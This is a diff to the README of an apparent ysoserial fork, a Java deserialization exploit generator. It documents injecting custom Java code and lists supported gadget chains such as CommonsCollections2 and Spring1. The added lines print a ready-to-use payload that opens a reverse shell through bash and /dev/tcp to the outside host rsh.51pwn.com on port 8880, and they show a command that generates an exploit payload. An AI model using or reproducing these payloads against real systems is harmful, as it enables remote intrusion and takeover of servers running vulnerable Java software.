@@ -17,7 +17,29 @@ eg:
 export Custom_Code_51pwn='java.lang.Runtime.getRuntime().exec(new String[]{"bash" ,"-c" ,"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1"});'
 ```
 - Allows java fragment code injection to be obtained from the current directory file **Custom_Code_51pwn** to solve complex problems
-<img width="290" alt="image" src="https://github.com/hktalent/ysoserial/assets/18223385/70e8415d-4a2e-49e7-a6f0-0063c666c7f0">
+```
+$ cat Custom_Code_51pwn 
+try {new javax.script.ScriptEngineManager().getEngineByName("JavaScript").eval("var x=new java.lang.ProcessBuilder(\"bash\",\"-c\",\"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1\",\"&\");x.start().getInputStream();");}catch (java.lang.Throwable e8876){}
+
+java -jar /Users/51pwn/Downloads/ysoserial-all.jar CommonsCollections2 'xx'>cc2
+```
+List :
+- Click1
+- CommonsBeanutils1
+- CommonsCollections2
+- CommonsCollections3
+- CommonsCollections4
+- Hibernate1
+- JavassistWeld1
+- JBossInterceptors1
+- Jdk7u21
+- JSON1
+- MozillaRhino1
+- MozillaRhino2
+- ROME
+- Spring1
+- Spring2
+- Vaadin1
 
 
 ## Description
